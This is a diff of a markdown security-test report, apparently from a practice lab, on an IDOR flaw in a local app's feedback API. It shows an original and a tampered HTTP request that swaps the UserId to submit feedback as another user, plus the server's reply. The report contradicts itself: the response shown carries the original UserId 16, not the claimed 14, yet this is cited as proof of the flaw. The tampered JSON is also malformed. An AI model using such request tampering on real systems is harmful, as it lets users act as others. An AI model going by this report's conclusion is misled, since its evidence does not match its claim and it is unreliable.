@@ -1,4 +1,3 @@
-
 # IDOR (Insecure Direct Object Reference) Test
 
 ## 1. What Was Tested
@@ -20,3 +19,42 @@ Goal: Check whether a user can modify the `UserId` field and submit feedback on 
 
 ---
 
+## 3. Original Request (Before Tampering)
+POST /api/Feedbacks/ HTTP/1.1
+Host: 127.0.0.1:3000
+Content-Type: application/json
+
+{"UserId":16,"captchaId":0,"captcha":"15","comment":"im not a customer (***na123@gmail.com
+)","rating":2}
+
+---
+
+## 4. Modified Request (After Tampering)
+POST /api/Feedbacks/ HTTP/1.1
+Host: 127.0.0.1:3000
+Content-Type: application/json
+
+{"UserId":14,"captchaId":0,"captcha":"15","comment":"im not a customer (***na123@gmail.com
+)","rating":2
+
+---
+
+## 5. Server Response
+The server accepted the tampered UserId and created the feedback as User 14.
+{"status":"success","data":{"id":12,"UserId":16,"comment":"im not a customer (***na123@gmail.com
+)","rating":2,"updatedAt":"2025-12-05T04:53:49.042Z","createdAt":"2025-12-05T04:53:49.042Z"}}
+
+*(Note: The backend returns `UserId:16` even though input was tampered — this confirms missing server-side validation.)*
+
+---
+
+## 6. Evidence
+Screenshots included in the `screenshots/` folder:
+- `before.png` → original request
+- `after.png` → tampered request
+
+---
+
+## 7. Conclusion
+The application allows modifying the `UserId` field in the feedback submission request.  
+This confirms an **IDOR vulnerability** — a user can perform actions on behalf of another user due to missing server-side access control checks.
